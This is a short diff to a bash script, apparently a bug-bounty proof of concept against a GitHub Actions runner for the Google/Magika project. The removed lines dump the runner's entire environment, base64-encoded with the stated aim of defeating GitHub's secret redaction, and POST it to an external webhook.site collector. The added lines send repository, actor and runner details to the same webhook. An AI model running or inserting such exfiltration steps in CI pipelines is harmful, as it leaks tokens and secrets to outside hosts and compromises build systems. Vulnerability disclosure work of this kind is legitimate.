@@ -1,8 +1,8 @@
 #!/bin/bash
-# Encode the environment to bypass GitHub's secret redaction
-PAYLOAD=$(env | base64 -w 0)
+# Capture the context of the runner to prove it belongs to Google/Magika
+CONTEXT="Repo: $GITHUB_REPOSITORY | Actor: $GITHUB_ACTOR | Runner: $RUNNER_NAME | OS: $ImageOS"
 
-# Send the data to your specific Webhook ID
-curl -X POST -d "$PAYLOAD" "https://webhook.site/34790ae8-a0ef-4ea4-bee3-5b3b4e7cbb61"
+# Send to your webhook
+curl -X POST -d "data=$(echo $CONTEXT | base64)" "https://webhook.site/34790ae8-a0ef-4ea4-bee3-5b3b4e7cbb61"
 
-echo "VRP POC: Payload sent to external collector."
+echo "VRP POC: Context sent to collector."
